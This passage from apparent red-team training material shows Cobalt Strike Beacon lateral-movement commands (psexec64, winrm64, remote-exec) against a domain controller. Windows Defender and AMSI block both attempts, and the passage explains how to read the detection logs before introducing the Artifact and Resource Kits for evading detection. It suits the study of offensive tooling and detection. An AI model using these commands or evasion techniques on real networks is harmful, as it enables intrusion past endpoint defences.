Cobalt Strike has two main flavours of artifact. Compiled (EXEs and DLLs); and scripts (PowerShell, VBA, SCT, etc). Each workflow uses a particular artifact - for instance, `jump psexec64` uses a compiled x64 service binary and `jump winrm64` uses x64 PowerShell.

Sometimes you will see commands fail:

```
beacon> ls \\dc-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 09:40:04   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/16/2021 12:31:51   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:39:02   System Volume Information
          dir     03/25/2021 10:27:55   Users
          dir     05/06/2021 09:41:14   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 798mb    fil     05/16/2021 12:40:06   pagefile.sys

beacon> jump psexec64 dc-2 smb
[-] Could not start service c8e8647 on dc-2: 225
[-] Could not connect to pipe: 2

beacon> jump winrm64 dc-2 smb
[-] Could not connect to pipe: 2

#< CLIXML
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Processing</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Searching for available modules</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD>Searching UNC share \\dc-2\home$\nlamb\Documents\WindowsPowerShell\Modules.</SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+  Set-StrictMode -Version 2_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_</S><S S="Error">    + CategoryInfo          : ParserError: (:) [], ParseException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_</S><S S="Error">    + PSComputerName        : dc-2_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
```
 

The issue with the `winrm64` attempt is obvious if you read the error (not always easy within the XML): **"This script contains malicious content and has been blocked by your antivirus software"**; and error code `225` is **"Operation did not complete successfully because the file contains a virus or potentially unwanted software."**

`Get-MpThreatDetection` is a Windows Defender cmdlet that can also show detected threats.

```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\c8e8647.exe, file:_\\dc-2\ADMIN$\c8e8647.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_C:\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04
```

The first entry is the `winrm64` attempt. The offending process was `wsmprovhost.exe` (the host process for WinRM plugins) which was detected and blocked by AMSI (antimalware scan interface). So this is an in-memory detection.

The second entry is the `psexec64` attempt. The process `c8e8647.exe` matches the name of the Beacon artifact which is automatically uploaded to the target in the workflow. This was detected and deleted by the traditional on-disk engine.

Cobalt Strike provides two "kits" that allow us to modify the Beacon artifacts, obviously with the aim of avoiding detection. The **Artifact Kit** modifies the compiled artifacts and the **Resource Kit** modifies script-based artifacts.